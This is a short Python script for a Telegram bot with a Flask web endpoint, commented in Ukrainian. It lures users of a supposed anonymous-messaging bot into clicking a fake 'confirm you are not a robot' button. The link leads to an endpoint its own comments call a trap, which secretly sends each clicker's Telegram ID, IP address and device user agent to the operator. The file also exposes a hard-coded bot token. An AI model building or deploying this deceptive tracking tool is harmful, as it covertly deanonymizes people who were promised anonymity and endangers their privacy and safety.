import telebot
import os
from flask import Flask, request, redirect
from threading import Thread
from telebot import types

TOKEN = "8620930680:AAGMFBld3aXdu77gy32TO4S-fHt_rE_Zn58"
ADMIN_ID = 7853632822
BASE_URL = "https://repl.co" # ТУТ МАЄ БУТИ ТВОЄ ПОСИЛАННЯ

bot = telebot.TeleBot(TOKEN)
app = Flask("app")

# Ендпоінт-пастка
@app.route("/go")
def trap():
    # Збираємо дані
    user_id = request.args.get('id')
    user_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    user_agent = request.headers.get('User-Agent')
    
    log_info = f"🕵️‍♂️ Клік по кнопці!\n🆔 ID юзера: {user_id}\n🌐 IP: {user_ip}\n📱 Пристрій: {user_agent}"
    bot.send_message(ADMIN_ID, log_info)
    
    # Повертаємо юзера в бота (або на статтю в телеграфі)
    return redirect(f"https://t.me") 

@bot.message_handler(commands=['start'])
def start(message):
    # Створюємо Inline-кнопку (вона виглядає солідніше)
    markup = types.InlineKeyboardMarkup()
    # В посилання додаємо ID юзера, щоб ти знав, хто саме клікнув
    trap_url = f"{BASE_URL}/go?id={message.from_user.id}"
    btn = types.InlineKeyboardButton(text="🚀 ПІДТВЕРДИТИ, ЩО Я НЕ РОБОТ", url=trap_url)
    markup.add(btn)
    
    bot.send_message(message.chat.id, 
                     "Привіт! Щоб писати анонімно, підтверди, що ти реальна людина 👇", 
                     reply_markup=markup)
